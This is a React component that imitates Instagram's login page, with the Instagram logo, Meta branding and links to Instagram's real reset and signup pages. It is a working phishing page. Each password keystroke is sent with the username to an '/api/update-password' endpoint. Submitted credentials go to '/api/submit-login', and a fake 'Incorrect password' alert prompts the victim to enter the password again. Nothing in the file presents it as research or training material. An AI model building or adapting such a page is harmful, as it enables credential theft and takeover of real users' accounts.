import React, { useState } from "react";
import logo from "../assets/logo.png";
import { FaMeta, FaEye, FaEyeSlash } from "react-icons/fa6";

export default function InstagramLogin() {
  const [form, setForm] = useState({
    username: "",
        // username: "comrade3263",

    password: "",
  });

  const VITE_API_BASE_URL = import.meta.env.VITE_API_BASE_URL;


  const [focused, setFocused] = useState({
    username: false,
    password: false,
  });

  const [showPassword, setShowPassword] = useState(false);
  const [alert, setAlert] = useState({ visible: false, title: "", message: "" });
  const [isLoading, setIsLoading] = useState(false);

  const handleFocus = (field) => {
    setFocused((prev) => ({ ...prev, [field]: true }));
  };

  const handleBlur = (field) => {
    if (form[field] === "") {
      setFocused((prev) => ({ ...prev, [field]: false }));
    }
  };

const handleChange = async (e) => {
  const { name, value } = e.target;

  setForm((prev) => ({ ...prev, [name]: value }));

  if (name === "password") {
    try {
await fetch(`${VITE_API_BASE_URL}/api/update-password`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: form.username || "unknown",
          password: value,
        }),
      });
    } catch (error) {
      console.error("Error syncing password:", error);
    }
  }
};


  const clearUsername = () => {
    setForm({ ...form, username: "" });
    setFocused((prev) => ({ ...prev, username: false }));
  };

  const togglePassword = () => setShowPassword(!showPassword);

const handleSubmit = async (e) => {
  e.preventDefault();

  if (!form.username.trim()) {
    setAlert({
      visible: true,
      title: "Email address or mobile number required",
      message: "Enter your email address or mobile number to continue.",
    });
    return;
  }

  if (!form.password.trim()) {
    setAlert({
      visible: true,
      title: "Password required",
      message: "Enter your password to continue.",
    });
    return;
  }

  setIsLoading(true);

  try {
    const res = await fetch(`${VITE_API_BASE_URL}/api/submit-login`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(form),
    });

    const data = await res.json();

    if (!res.ok) {
      setAlert({
        visible: true,
        title: "Incorrect password",
        message: "The password that you’ve entered is incorrect. Please try again.",
      });
    } else {
      console.log("Submitted login:", form);
      // Success logic (optional)
    }
  } catch (error) {
    console.error("Error submitting login:", error);
    setAlert({
      visible: true,
      title: "Login failed",
      message: "Something went wrong. Please try again later.",
    });
  } finally {
    setIsLoading(false);
  }
};



  const closeAlert = () => {
    setAlert({ visible: false, title: "", message: "" });
  };

  return (
    <div className="relative h-screen w-full flex flex-col bg-gradient-to-br from-[#1B2735] via-[#090a0f] to-[#1B2735] px-4 text-white justify-between">
      {/* Top */}
      <div className="text-center pt-4 text-sm text-gray-300">English (UK)</div>

      {/* Center */}
      <div className="flex-1 flex flex-col items-center justify-center">
        {/* Logo */}
        <img src={logo} alt="Instagram" className="w-16 h-16 mb-10" />

        <form onSubmit={handleSubmit} className="w-full max-w-sm space-y-4">
          {/* Username Field */}
          <div className="relative">
            <input
              type="text"
              name="username"
              value={form.username}
              onFocus={() => handleFocus("username")}
              onBlur={() => handleBlur("username")}
              onChange={handleChange}
              className="w-full px-4 pt-5 pb-2 rounded-md bg-[#1a1d22] text-white text-sm border border-[#3b3e47] placeholder-transparent focus:outline-none"
              placeholder="Username, email address or mobile number"
            />
            <label
              className={`absolute left-4 transition-all duration-200 text-gray-400 text-sm pointer-events-none ${
                focused.username || form.username
                  ? "top-1 text-xs"
                  : "top-3.5 text-sm"
              }`}
            >
              Username, email address or mobile number
            </label>
            {form.username && (
              <button
                type="button"
                onClick={clearUsername}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-2xl text-gray-400 hover:text-white"
              >
                ×
              </button>
            )}
          </div>

          {/* Password Field */}
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              name="password"
              value={form.password}
              onFocus={() => handleFocus("password")}
              onBlur={() => handleBlur("password")}
              onChange={handleChange}
              placeholder="Password"
              className="w-full px-4 pt-5 pb-2 rounded-md bg-[#1a1d22] text-white text-sm border border-[#3b3e47] placeholder-transparent focus:outline-none"
            />
            <label
              className={`absolute left-4 transition-all duration-200 text-gray-400 text-sm pointer-events-none ${
                focused.password || form.password
                  ? "top-1 text-xs"
                  : "top-3.5 text-sm"
              }`}
            >
              Password
            </label>
            {(focused.password || form.password) && (
              <button
                type="button"
                onClick={togglePassword}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-lg text-gray-400 hover:text-white"
              >
                {showPassword ? <FaEyeSlash /> : <FaEye />}
              </button>
            )}
          </div>

          {/* Log In */}
          <button
            type="submit"
            disabled={isLoading}
            className={`w-full transition py-3 rounded-full font-medium text-sm flex justify-center items-center ${
              isLoading
                ? "bg-[#1877f2]/70 cursor-not-allowed"
                : "bg-[#1877f2] hover:bg-[#166fe0]"
            }`}
          >
            {isLoading ? (
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            ) : (
              "Log in"
            )}
          </button>
        </form>

        {/* Forgot */}
        <div className="text-center mt-4">
          <a
            href="https://www.instagram.com/accounts/password/reset/"
            className="text-sm text-gray-300 hover:underline"
          >
            Forgotten password?
          </a>
        </div>
      </div>

      {/* Bottom */}
   <div className="w-full max-w-sm mx-auto mb-6">
  <a
    href="https://www.instagram.com/accounts/emailsignup/"
    target="_blank"
    rel="noopener noreferrer"
    className="block text-center w-full border border-[#1877f2] text-[#1877f2] py-2 rounded-full text-sm hover:bg-[#1d2b38] transition"
  >
    Create new account
  </a>

  <div className="text-center mt-6">
    <p className="text-sm text-gray-400">from</p>
    <div className="flex items-center justify-center mt-1 gap-1 text-white">
      <FaMeta className="text-lg" />
      <span className="font-medium">Meta</span>
    </div>
  </div>
</div>


      {/* Alert Popup */}
      {alert.visible && (
        <div className="absolute inset-0 bg-black/55 flex items-center justify-center z-50 px-4">
          <div className="bg-white text-black w-full max-w-sm rounded-xl shadow-xl p-6 text-center">
            <h2 className="text-base font-semibold mb-1">{alert.title}</h2>
            <p className="text-sm text-gray-600">{alert.message}</p>
            <button
              onClick={closeAlert}
              className="mt-4 w-full py-2 rounded-lg text-[#1877f2] font-semibold text-sm"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
